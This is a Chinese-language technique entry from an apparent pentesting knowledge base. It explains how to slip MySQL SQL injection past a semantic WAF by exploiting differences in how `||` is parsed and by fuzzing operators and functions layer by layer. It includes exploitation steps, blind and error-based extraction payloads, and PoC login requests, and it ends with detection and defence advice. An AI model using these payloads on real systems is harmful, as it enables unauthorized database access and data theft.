---
id: web-generic-sqli-semantic-waf-layerwise-bypass
title: 语义型 WAF 的 SQLi 绕过：OR/|| 解析差异与闭合-运算符-函数逐层 fuzz
type: scenario
domain: web
path: web/generic/sqli
technique: semantic-waf-layerwise-bypass
aliases:
- 语义型 WAF 绕过
- OR 与 || 语义差异
- 闭合-运算符-函数 fuzz
- 某池 WAF SQLi 绕过
- cot pow extractvalue 盲注
- LPAD 报错注入
tags:
- sqli
- waf-bypass
- semantic-analysis
- mysql
- boolean-blind
- error-based
- fuzz
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:44:12+08:00'
  notes: 已对照原文与 12 张截图核对：OR/|| 语义差异、闭合→运算符→函数逐层 fuzz、cot/pow/extractvalue/LPAD 的放行与报错结果均一致；某池 9.3.5 + MySQL 5.7.26 仅为实验环境，原文未给受影响版本区间，故未设置 affected_versions 合理。小注：原文把 cot/pow 归为布尔类，截图实际表现为 Data truncation 报错，分类略粗但不影响方法可用；concat 被拦后用 LPAD 替代与截图一致。未验证点：未复现。
---

## 一句话结论

基于语义分析的 WAF 会按“通用 SQL 语法”判断 payload 是否有害；利用 MySQL 与其他数据库的语义差异（如 `||` 在 MySQL 是逻辑或、在 PostgreSQL/Oracle 是字符串连接），并按照“先闭合引号、再 fuzz 运算符、最后 fuzz 函数”的逐层方式构造，就能让 WAF 判定为无危害而放行，同时后端仍执行注入。

## 原理

- 语义型 WAF 的检测流程通常是：解析 HTTP → 深度解码参数 → 猜测攻击类型 → 词法分析 → 语法分析 → 语义分析 → 阻断。它不依赖固定正则，而是尽量理解 payload 的“语义”。
- 关键弱点：WAF 不知道后端真实数据库类型，只能按通用/多数据库语法做语义匹配。MySQL 中 `||` 是逻辑或运算符，而 PostgreSQL/Oracle 中 `||` 只是字符串连接符；WAF 会把 `1 || 1=1` 理解为字符串拼接（无危害）而放行，把 `1 OR 1=1` 识别为逻辑或（有危害）而拦截。
- 验证 WAF 确实“理解了语法只是判定无害”的方法：把 `1 || 1=1` 中的 `1=1` 换成 `length(user())`，如果被拦截，说明 WAF 能解析该结构，只是先前判定为字符串拼接；这为后续逐层构造提供了依据。
- 逐层构造法：不要一次性提交完整 payload，而是按 SQL 语法结构分层探测，避免“语法错误放行”与“语义无害放行”混淆：
  1. 闭合单引号：`1'--+`、`1'#`；
  2. fuzz 连接运算符：找出 WAF 放行但 MySQL 仍可执行表达式的运算符；
  3. fuzz 函数/条件：用 `if()` 等函数承载布尔/报错/延时逻辑，找出放行的函数组合。
- 实测（某池 9.3.5 + MySQL 5.7.26）：`XOR`/`OR`/`AND`/`BETWEEN` 被拦截；`+ - * / DIV % MOD = <=> <> != > < >= <= || && NOT ! & | ^ ~ << >> := IN LIKE REGEXP` 等放行；`1'/if(length(user())=1,1,1)#` 放行，而 `SUBSTR(USER(),1,1)='1'`、`length(database())=1` 被拦截。
- 函数层：`sleep`、`BENCHMARK`、`select` 与 `if` 组合被拦截；布尔可用 `cot(0)`、`pow(1,1)`；报错可用 `extractvalue(1,1)`、`extractvalue(1,USER())`（输出会截断），`concat()` 被拦截时可用 `LPAD(USER(),20,'~')` 替代。
- 局限：该构造高度依赖具体 WAF 版本、后端数据库与 SQL 上下文；把 `user()` 换成 `database()` 可能直接失效，需要按请求重新 fuzz。

## 触发条件

- 目标使用语义/语法分析型 WAF（而非纯正则），且 WAF 与后端数据库类型不一致或按通用语法判定。
- 存在可注入的 SQL 上下文（如 `username = '[PAYLOAD]' AND password = 1`），且能观察布尔/报错/时间差异。
- 后端为 MySQL（或其他 `||` 语义与 WAF 假设不同的数据库）。
- 攻击者能对参数做大量 fuzz 并观察拦截/放行差异（注意请求频率与封禁）。

## 利用步骤

1. 确认 WAF 类型与后端数据库（报错信息、版本函数、响应差异）。
2. 先测闭合：提交 `1'--+`、`1'#`，确认不触发拦截且 SQL 结构可闭合。
3. 用 `1' <op> 1=1#` 模板 fuzz 运算符，记录放行/拦截集合；优先尝试 `||`、`&&`、算术运算符、位运算符。
4. 用 `1'/if(<cond>,1,1)#` 模板 fuzz 条件表达式与函数：
   - 布尔：`cot(0)`、`pow(1,1)`；
   - 报错：`extractvalue(1,1)`、`extractvalue(1,USER())`，需要拼接时用 `LPAD()`；
   - 时间：若 `sleep`/`BENCHMARK` 被拦，改用其他耗时原语或放弃时间盲注。
5. 构造数据提取 payload，例如先取长度再逐字符：
   ```sql
   1'/if(length(user())=<n>,cot(0),1)#
   1'/if(ascii(substr(user(),<i>,1))=<c>,cot(0),1)#
   ```
6. 记录每个 payload 的放行/拦截结果，形成该 WAF 的“语法白名单”，再组合出完整注入。

## PoC

```http
POST /login HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=1'||1=1#&password=1
```

```http
# 闭合 + 运算符 + 函数逐层探测（示例）
username=1'--+&password=1
username=1'||1=1#&password=1
username=1'/if(length(user())=1,1,1)#&password=1
username=1'/if(length(user())=1,cot(0),1)#&password=1
username=1'/if(length(user())=1,pow(1,1),1)#&password=1
username=1'/if(length(user())=1,extractvalue(1,1),1)#&password=1
username=1'/if(length(user())=1,extractvalue(1,USER()),1)#&password=1
username=1'/if(length(user())=1,extractvalue(1,LPAD(USER(),20,'~')),1)#&password=1
```

```text
# 实测放行/拦截（某池 9.3.5 + MySQL 5.7.26）
拦截: XOR / OR / AND / BETWEEN / SUBSTR(USER(),1,1)='1' / length(database())=1
放行: + - * / DIV % MOD = <=> <> != > < >= <= || && NOT ! & | ^ ~ << >> := IN LIKE REGEXP
放行: 1'/if(length(user())=1,cot(0),1)#
放行: 1'/if(length(user())=1,extractvalue(1,USER()),1)#  （输出截断）
```

## 变体与关联

- 变体：用 `&&`/`||` 替代 `AND`/`OR`；用 `CASE WHEN` 替代 `IF`；用 `GREATEST`/`LEAST` 改写比较。
- 变体：垃圾字符绕过——把干扰字符填充到一个无效参数（如 `&junk=...`）中，避免破坏正常参数；该手法通常只适用于 POST。
- 变体：`extractvalue` 输出被截断时，用 `LPAD`/`substr` 分段读取，或改用布尔盲注。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]]（关键字被过滤时的替代原语）、[[web-generic-sqli-error-based-extraction]]（updatexml/extractvalue 报错注入）、[[web-generic-sqli-content-type-dual-header-waf-bypass]]（另一种 WAF 解析差异）。
- 边界：WAF 按后端数据库精确建模、对 `||` 也按逻辑或处理、函数/运算符白名单更严格、或请求频率触发封禁时，绕过失效。

## 检测与防御

- 检测：同一参数出现大量“闭合符 + 运算符 + 函数”组合的探测请求；`||`、`&&`、`cot`、`pow`、`extractvalue`、`LPAD` 等特征；放行/拦截差异被用于 fuzz 的行为。
- 修复：WAF 应按后端真实数据库类型做语义分析，而不是通用语法；对 `||` 在 MySQL 场景按逻辑或处理；对函数组合做上下文敏感检测。
- 加固：根本防御是参数化查询/预编译，不依赖 WAF；对输入做类型校验；限制错误回显；监控异常 SQL 关键字与 fuzz 行为。
